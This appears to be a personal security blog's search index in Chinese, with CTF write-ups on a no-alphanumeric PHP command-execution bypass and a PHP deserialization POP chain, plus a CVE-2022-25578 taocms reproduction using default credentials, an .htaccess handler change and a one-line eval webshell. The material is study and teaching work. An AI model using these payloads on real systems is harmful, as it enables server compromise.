<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>7-13总结</title>
      <link href="/2024/07/14/7-13%E6%80%BB%E7%BB%93/"/>
      <url>/2024/07/14/7-13%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b733e2a6d6df3187d14d8fbe00f6b2fd3966330d35f955aedbb7d9048af9503c">4630436162ade97ba2718b7d0c4b3b63aced30534934d6d7bc15056168c47732f5a3fda84eeeefcd2704ec4c9cd1a256ef1aa65a5d01b3d695061d724a71e2bb226febd94d151d111dd10630fce41cddfcec56c2129ae27032db461d26299a515f1cdfe74eff7082c47237bff28fd12c3ef8aec19299bcc83969106c63cfdb3d38f0cf0327ad357c11a404e739f6238ee5daa8bbbe3a09a29e1d4be4dd7dce75f4a58954953db00cd4e6c757b940958e3e21f9d2a61e26cfdb314df2e8626470e4a0f2160577863f95abda4d43ffd93f4d1a3d19a7a13cea68446911abb66c2933bc2be4541648f173934eb8e3fb0dc41db13a05a03dc078d696dad44816839330698391608a605beb6bc0dc601aab4c296c337d7f9058fc763a6fd06348a9f9ac7f637638d8a28048fe766c79f5351bbdcb839653ee6c19c08d280114340c991adef18c90c1e376a98caf99867d1e47e91e4476b3ff404cc5064e2210810e43b3f108983e5a6d32bd7f9c88bd18c5d2797265871f9431ebbb41f21cc678b4239f59b54b149927b73eeeac7163f1d26f3f31dd3005154fc0441a4330440489ee73dd28e58b7b820cfca529fb9c2d526b5d2028035974ae74a597a28fab0286be8717d3c9883c8224bf7e7f8fb57b3e4d0af899fbbc1a8d06dab90e74b9b433f79509ffc647b934ecd72c194bcffe9d973442816bfef7c40f1b9d08f329669bc51bef3a4e8025f40123b53ed2ccf4a460802c87c738cecc5a2c4db6f5209bdc36841937ba62ddfba2b54766e77136fe1ee3541910cf3920779e677f61a8b0c556da1866530e6a3fdfa5225b5944481451cb12a1be073452479f5f7e67e416516c6ed4e8f75ac9eeef77458a8a39571b8ff6a5608c2d5281a85baef8406576164f89c2cff87b35788acdf3ef9ddbe90b247fce0730acf32191a70ae3fcab5601da3d865e5de07c9ff72331740063048d93dbf5eaf2309a8f9195c3a6e55e9a968d38250ded60278dccdc79a164aee41df3294d118d480494968dc194ca28342aa8babaeb7f1c02118b8a37d2fe92f7ad5b6af2294c13c7e7d4008fccaf3f6f809499dd64ed76ad8eeb26e2565007396578009b21096b8cbae453c32b0b882d95e2a389005821e2c1413c3272afec91b24cabf096e6e37f844ec1d8154bb8f255956d31220554b44783310ea5c7a7029fdea45ff44b8dd53a7997a7864c63a60105a0924aac1eee79eede0d1b006da2e52140dbcbc644abd2eb2e8e81044b7f07534377bc518707e4cd67899a63b5e6ee339a1c8ad82576d46797c47d4a3f7b619af70f3af064a087f23cb945adeef909a8b1bf2d14549f07021695b48f7d3e20c06976976b225194bd4d18c58bb9ee78dc3b6fcf20e82b84868402f54808a5ff191af3772f088a3824fae531c886820a5f4311eaa6dd44945af2b66dea277ff8a7d909162f0d5b2bafba5b8d71400660a8320006e3ca261414d4ebc3634f530f03fc178bd4fd67a7bdee965105d49f35a44d893a161c0aa19b82f21a1dcb8452b5c781d27c3b712dbac0563e7ae906af1597ed11c95c4fc38dc054ea7be806dbccaea35afff0b5f3ad8acd8b2150353f80d4a4d89a56d56f21061f86a60a64d9f349c94ae1eb7fb8779eacfeb63beea79796f5e56bcd3d8b4b0e54e7b91ee2d0202a911b8a15a4eae8deeb57417e248b38d997400d7d8a2f071decb39d30ed229329915deb53561b19811cf2172df46222724f9163656eda2653001a019a1637250e393914dbe0a8e08e69f859656d32dd1061734e46de0341cd5a6a1a536ec8a02e65c2859e24c13e98f70c43ce146936590320aca1c45731f92799975c2a1531ec17e3f6baf6a401bf8b9edb40ad35278f6acebed14055aa2cf64c4d750f867e697cd42ae4c93cedae2bcac7f4adbcb22927fae3785f389e7eaafb577de54a01b7711f1a92d05a68fe929d564036d8abf2a0d48a0adbaaaa9f2b54ff3cef71e02bc5520a210c46b9ee7cbdfaea4bd796240cd4cd104e5da5417f6e01d084b42f567e77f4b8cebdbd1c7db344c52718e56a8d7754a00f967ed71a8a02b9eec18b3fc07c025c838348548024b03bab505ebfaf9b755b9fbdaa739479c3a19e45a6dddab3a583de798ab5e0b7f358236916763bc8dd3ca6c48078668b83fd332758080775fb3ac7750158e394b9f09e8bd35771ae19f323b868121e5cee30f8d990cda5b8efa4d3f864a0cf4bafe2f5b812f8721527e06fb64b31dfa9ffb0828ccacd2551df9f61a8936ea2bacb2c62f4153b3f16be6eaf83d20e405da8e5ae5e77589ca08a1f00e8cda4ec24709e0c5a98fc58fd0b94fef532b0e99276bb52b3252d2d92ae0e5e267ff07ec0a7794c0b9f289bb00af04b8dc60236573e7f8be1564ca16ec7156f0bd9faaefc662eae2844de116414b8fa28967a956da79e703214683d3a58659662a65c8d757220a38738dd1f2422c1587c8996573840a9f2586b17334a560baaa33c6b7101bf48fc9feeec636fa6c9b520a009cd631f7f9a076d104a1dc20977e2762772f0d73cca0df4424c8a35b60ad9614d60236ed2b64de6f0c233664fd54e6d2fc4d38a1601fa3b955dbecfb6998c07fdac7cba05e8fd27961dabc0b7f8dd0ab1def7e26f2d0578afe7b7b189c27f1c162b068b99da995707e7db2f4abc4898dc5571917aa9caad23909663269f575e4589e067a91afe95bed193755a6d5ae686c1871007845ce2a2adc23d59dfbdfb7be585a5e6e3263239b3280577f1517d823be41d18bb3f269269ecbf418bc7a6f6e10cec2d0e03cc731eaed518d810e7de064103ecb24209b2c273aff03e89211e3f396e3cfde8ba83590fa8fe835d4d8210b204c4bd63067c5e483c715ab583354d9f4afcfa9d69691b6dab2f3330b042dc993bf40078f09fcb8d14d1d357ee0a7518943727dae6fa2c612370f7c3a1d9b02498e77f2f47cdb4d9be09707938b8dbb769f49650f28b8ee7acd86e5351a5da236357368c6e2278e0efb572112e65204408b509f48bb6861e28de8f02b4874471b9ba6e58d1ea8c644adb37d2b4fa68d67e3e68a9e90cd4970c3817e1f131c45ea9b5a368cb7d09860bf9a955c49b5ffa9660a09a8d1ec840eab2cbe40419b4104b8a7f53d0bdea13c85b3e54e63b4d8f86b1b4331938a5ffaf9aa823e1b5987c1c432a4a471d9b918bbcb1a40926d6aedf6811ff983c8683e3ed9ef3e5b9cdc2e223fe8bf0a130cbbb7025e463da6a9473ee6ed656c27ecdc7c8eb8dc788e1ecae6912562438221113988549eb358ba29d4e3b9840ff8033ddfbd91b8b8e6f18f968697af2d5dcb4d889cf09ca18eeee0434dba570b5922fdd8d39f7e9958b49086c8edca34e060f3c054bc8c045bc28f92e48619b689ba6546be58842ec6e66448b2728970aebe62e7f138aec523f5bc35767cfea0ead8a0d872cccc3a09f84a07d4eef8fd5ff54fe61227dca9ce3b659921b0228ebbf6eb8b7464cbc8d91d482a525e6c618cb6cbf774672ed261de051881c3ecd2168cdc526f271514fc66640587802e4e8007863d7be17407bf913bf003de1a7f7129cb27464298e14f35ad24d7e8c29</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2024/07/13/RCE/"/>
      <url>/2024/07/13/RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="无字母数字的命令执行-web55"><a href="#无字母数字的命令执行-web55" class="headerlink" title="无字母数字的命令执行(web55)"></a>无字母数字的命令执行(web55)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><h3 id="1-点命令"><a href="#1-点命令" class="headerlink" title="1.点命令"></a>1.点命令</h3><p>​Linux中的点(<code>.</code>)命令,即source命令，可以用当前的shell执行一个文件中的命令，且是不需要file有x权限的。比如，当前运行的shell是bash,则<code>. file</code>的意思是用bash执行file文件中的命令</p><h3 id="2-通配符的使用"><a href="#2-通配符的使用" class="headerlink" title="2.通配符的使用"></a>2.通配符的使用</h3><p>​glob支持<code>**</code>替代0个及多个字符</p><p>​glob支持<code>?</code>代替1个任意字符</p><p>​glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。</p><p>​glob支持利用<code>[0-9]</code>来表示一个范围。</p><h3 id="3-PHP保存文件机制"><a href="#3-PHP保存文件机制" class="headerlink" title="3.PHP保存文件机制"></a>3.PHP保存文件机制</h3><p>​当PHP接收到新上传的文件时，它会将上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpxxxxxx,后6个x为随机的大小写字母</p><h2 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h2><h3 id="1-构造一个post上传数据包并抓包"><a href="#1-构造一个post上传数据包并抓包" class="headerlink" title="1.构造一个post上传数据包并抓包"></a>1.构造一个post上传数据包并抓包</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http:xxxxxxx/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​将这段代码保存为html文件，然后，点击上传1.php(加入sh命令，如下)，抓包即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">ls</span><br></pre></td></tr></table></figure><h3 id="2-构造poc进行RCE"><a href="#2-构造poc进行RCE" class="headerlink" title="2.构造poc进行RCE"></a>2.构造poc进行RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=. /???/????????[@-[]</span><br></pre></td></tr></table></figure><p>​[]中<code>@-[</code>代表ASCII表中从<code>@</code>到<code>[</code>的所有字符，即A-Z</p><p><img src="/2024/07/13/RCE/1.png" alt="1"></p><p>​由于随机生成后六位字符，具有不确定性，所以多尝试发包几次，总会成功的</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-25578</title>
      <link href="/2024/07/13/CVE-2022-25578/"/>
      <url>/2024/07/13/CVE-2022-25578/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-25578"><a href="#CVE-2022-25578" class="headerlink" title="CVE-2022-25578"></a>CVE-2022-25578</h1><p><a href="https://github.com/taogogo/taocms/issues/28">https://github.com/taogogo/taocms/issues/28</a></p><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><p>​taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</p><h2 id="二、知识点"><a href="#二、知识点" class="headerlink" title="二、知识点"></a>二、知识点</h2><h4 id="1-什么是-htaccess文件："><a href="#1-什么是-htaccess文件：" class="headerlink" title="1.什么是.htaccess文件："></a>1.什么是.htaccess文件：</h4><p>htaccess文件（或者分布式<a href="https://baike.baidu.com/item/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/286550?fromModule=lemma_inlink">配置文件</a>），全称是<a href="https://baike.baidu.com/item/Hypertext/812934?fromModule=lemma_inlink">Hypertext</a> Access（<a href="https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC/2832422?fromModule=lemma_inlink">超文本</a>入口）。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有<a href="https://baike.baidu.com/item/%E5%AD%90%E7%9B%AE%E5%BD%95/4728026?fromModule=lemma_inlink">子目录</a>。作为用户，所能使用的命令受到限制</p><h4 id="2-htaccess文件的功能："><a href="#2-htaccess文件的功能：" class="headerlink" title="2..htaccess文件的功能："></a>2..htaccess文件的功能：</h4><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><h4 id="3-本漏洞的应用："><a href="#3-本漏洞的应用：" class="headerlink" title="3.本漏洞的应用："></a>3.本漏洞的应用：</h4><p> 改变文件扩展名，我们需要在.htaccess文件末尾加上一下内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h4><p>搜索有关taocms的信息，发现默认登录密码，admin:tao,登入后台</p><h4 id="2-寻找上传点"><a href="#2-寻找上传点" class="headerlink" title="2.寻找上传点"></a>2.寻找上传点</h4><p>在文件管理处发现有个新建文件夹和上传功能，但是好像不能用，但是发现目录下有.htaccess文件和一些php文件，那就直接在.htaccess里添加内容：AddType application&#x2F;x-httpd-php .png，在其中一个php文件中写入木马，如<?=eval($_POST[1])?></p><h4 id="3-蚁剑连接"><a href="#3-蚁剑连接" class="headerlink" title="3.蚁剑连接"></a>3.蚁剑连接</h4><p>添加URL地址，后面加上写了一句话木马的php文件，连接密码为1</p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化一道题详解</title>
      <link href="/2024/07/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/07/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/bkofyZ/p/17660907.html#comment_form_container">https://www.cnblogs.com/bkofyZ/p/17660907.html#comment_form_container</a></p><h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><h3 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h3><p><strong>定义：</strong>序列化就是将一个对象转换成字符串，反序列化则是将字符串重新恢复成对象</p><p>PHP序列化函数：serialize()</p><p>PHP反序列化函数：unserialize()</p><h3 id="几个常用的魔术方法："><a href="#几个常用的魔术方法：" class="headerlink" title="几个常用的魔术方法："></a>几个常用的魔术方法：</h3><table><thead><tr><th>名称</th><th align="left">触发时机</th></tr></thead><tbody><tr><td>__construct()</td><td align="left">在对象实例化（创建对象）的时候自动触发</td></tr><tr><td>__destruct()</td><td align="left">在销毁对象的时候自动触发</td></tr><tr><td>__wakeup()</td><td align="left">执行unserialize()时，先会调用这个函数</td></tr><tr><td>__sleep()</td><td align="left">执行serialize()时，先会调用这个函数</td></tr><tr><td>__call()</td><td align="left">在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td align="left">访问私有或不存在的成员属性的时候自动触发</td></tr><tr><td>__set()</td><td align="left">对私有成员属性进行设置值时自动触发</td></tr><tr><td>__isset()</td><td align="left">对私有成员属性进行 isset 进行检查时自动触发</td></tr><tr><td>__unset()</td><td align="left">对私有成员属性进行 unset 进行检查时自动触发</td></tr><tr><td>__toString()</td><td align="left">把类当作字符串使用时触发</td></tr><tr><td>__invoke()</td><td align="left">当尝试将对象调用为函数时触发</td></tr></tbody></table><h3 id="一般做题顺序"><a href="#一般做题顺序" class="headerlink" title="一般做题顺序"></a>一般做题顺序</h3><p>​构造pop链，找出它的起点或者终点，再利用魔术方法的触发条件和题目的代码结构，将POP链完善</p><p>​POP链：就是利用魔法方法进行多次跳转后获取敏感数据的一种payload</p><h3 id="接下来开始代码审计"><a href="#接下来开始代码审计" class="headerlink" title="接下来开始代码审计"></a>接下来开始代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br></pre></td></tr></table></figure><h4 id="1）找到终点-Try-work-Hard的append"><a href="#1）找到终点-Try-work-Hard的append" class="headerlink" title="(1）找到终点,Try_work_Hard的append()"></a>(1）找到终点,Try_work_Hard的append()</h4><p>​想到可以利用php伪协议读取数据流，那么怎么触发append()呢，发现下面的<code>__invoke()</code>可以触发append();</p><h4 id="2-接着Try-work-Hard-invoke"><a href="#2-接着Try-work-Hard-invoke" class="headerlink" title="(2)接着Try_work_Hard::__invoke()"></a>(2)接着Try_work_Hard::__invoke()</h4><p>​_<code>_invoke</code>:   当尝试将对象调用为函数时触发，看了一圈，发现$Make_a_Change类里面的$effort是可控的,且<code>__get</code>方法可以返回可控的函数，那就想办法让$effort为<code>Try_work_Hard</code>的类的对象</p><h4 id="3-接着Make-a-Change-get"><a href="#3-接着Make-a-Change-get" class="headerlink" title="(3)接着Make_a_Change()::__get()"></a>(3)接着Make_a_Change()::__get()</h4><p>​<code>__get</code>访问私有或不存在的成员属性的时候自动触发,利用它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="（4）接着Road-is-Long-toString"><a href="#（4）接着Road-is-Long-toString" class="headerlink" title="（4）接着Road_is_Long::__toString()"></a>（4）接着Road_is_Long::__toString()</h4><p>​实例化化之后，让它的string指向Make_a_Change的类的对象，</p><h4 id="（5）继续Road-is-Long-wakeup"><a href="#（5）继续Road-is-Long-wakeup" class="headerlink" title="（5）继续Road_is_Long::__wakeup()"></a>（5）继续Road_is_Long::__wakeup()</h4><p>​__toString: 把类当作字符串使用时触发,</p><p>因为有protected属性的$var,这反序列化后会带特殊符号%00(url编码)，这个你复制粘贴不过来，但是urlencode可以显示出来好复制，不用你之后改</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php魔术方法</title>
      <link href="/2024/07/01/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
      <url>/2024/07/01/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" 